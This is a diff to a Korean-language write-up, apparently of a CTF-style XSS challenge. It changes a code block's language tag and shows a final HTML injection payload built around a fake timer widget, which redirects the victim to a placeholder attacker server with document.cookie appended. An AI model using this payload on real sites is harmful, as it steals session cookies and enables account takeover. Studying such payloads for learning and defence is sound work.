@@ -216,7 +216,7 @@ function T() {
 
 그래서 10초가 아닌 즉시 스크립트가 실행되도록 변경하는 스크립트를 추가하였으며, 최종적으로 만들어진 쿼리는 다음과 같다.
 
-```javascript
+```html
 <div class="timer d-flex p mb-3 flex-md-row grow align-items-stretch" id="timer"><div class="timer__display screen d-flex justify-content-center"><div class="align-self-center font-weight-fat"><span class="minutes">00</span> <span class="colon"></span> <span class="seconds">10e-3</span></div></div></div><div class="button button--small button--blue js-difficulty d-flex justify-content-center align-items-center button js-start-button grow button--green d-flex justify-content-center align-items-center"><i class="icon ion-play"></i></div><script class="js-user"></script><div id="audiences">location.href="http://[MY SERVER]/"+document.cookie;</div>
 ```
 
